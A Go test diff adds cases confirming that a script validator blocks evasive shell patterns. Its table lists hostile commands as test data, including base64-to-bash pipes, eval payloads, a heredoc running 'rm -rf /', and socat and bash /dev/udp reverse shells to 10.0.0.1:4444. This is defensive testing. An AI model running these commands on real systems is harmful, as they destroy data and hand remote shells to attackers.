@@ -66,6 +66,37 @@ func TestValidateScript_DangerousPatterns(t *testing.T) {
 	}
 }
 
+func TestValidateScript_BypassPatterns(t *testing.T) {
+	bypass := []struct {
+		name   string
+		script string
+	}{
+		{"base64 decode", "echo cHduZWQ= | base64 -d | bash"},
+		{"base64 --decode", "base64 --decode < payload.txt | sh"},
+		{"eval variable", "eval $PAYLOAD"},
+		{"eval substitution", "eval $(cat /tmp/cmd)"},
+		{"heredoc bash", "bash <<EOF\nrm -rf /\nEOF"},
+		{"heredoc python", "python3 <<SCRIPT\nimport os\nSCRIPT"},
+		{"python -c", "python3 -c 'import os; os.system(\"id\")'"},
+		{"perl -e", "perl -e 'system(\"id\")'"},
+		{"ruby -e", "ruby -e 'system(\"id\")'"},
+		{"node -e", "node -e 'process.exit(0)'"},
+		{"node --eval", "node --eval 'console.log(1)'"},
+		{"php -r", "php -r 'system(\"id\");'"},
+		{"lua -e", "lua -e 'os.execute(\"id\")'"},
+		{"socat reverse shell", "socat -e /bin/bash 10.0.0.1:4444"},
+		{"bash /dev/udp", "bash -i >& /dev/udp/10.0.0.1/4444 0>&1"},
+	}
+
+	for _, tc := range bypass {
+		t.Run(tc.name, func(t *testing.T) {
+			err := validateScript(tc.script)
+			require.Error(t, err, "expected bypass pattern to be blocked: %s", tc.script)
+			assert.Contains(t, err.Error(), "dangerous command pattern")
+		})
+	}
+}
+
 func TestValidateScript_SafeScripts(t *testing.T) {
 	safe := []string{
 		"echo hello",
@@ -76,7 +107,7 @@ func TestValidateScript_SafeScripts(t *testing.T) {
 		"wc -l < /tmp/report.txt",
 		"date +%s",
 		"go test ./...",
-		"python -c 'print(1+1)'",
+		"cat /tmp/report.txt | wc -l",
 	}
 
 	for _, s := range safe {
